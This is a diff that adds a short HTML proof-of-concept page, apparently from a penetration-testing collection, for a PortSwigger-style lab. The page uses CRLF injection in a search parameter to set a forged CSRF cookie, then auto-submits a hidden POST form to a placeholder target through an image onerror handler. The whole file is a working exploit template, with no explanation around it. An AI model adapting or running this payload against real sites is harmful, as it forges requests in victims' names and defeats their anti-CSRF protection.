@@ -1,0 +1,12 @@
+<html>
+<title>Hacked</title>
+<body>
+    <h1 align="center">CRLF-Chaining-To-Bypass-CSRF-Token-Exploit</h1>
+    <form align="center" method="POST" action="https://target">
+        <input type="hidden" name="parameter" value="parameter_Value">
+        <input type="hidden" name="csrf_token_parameter" value="csrf_token_fake_value">
+   </form>
+   <img src=" https://acb31f821e84332a809da51f00d200ce.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf_token_parameter=csrf_token_fake_value" onerror="document.forms[0].submit();"/>
+   <p align="center"><b>Share the Exciting Hacking Material of Penetration-List</b></p>
+</body>
+</html>
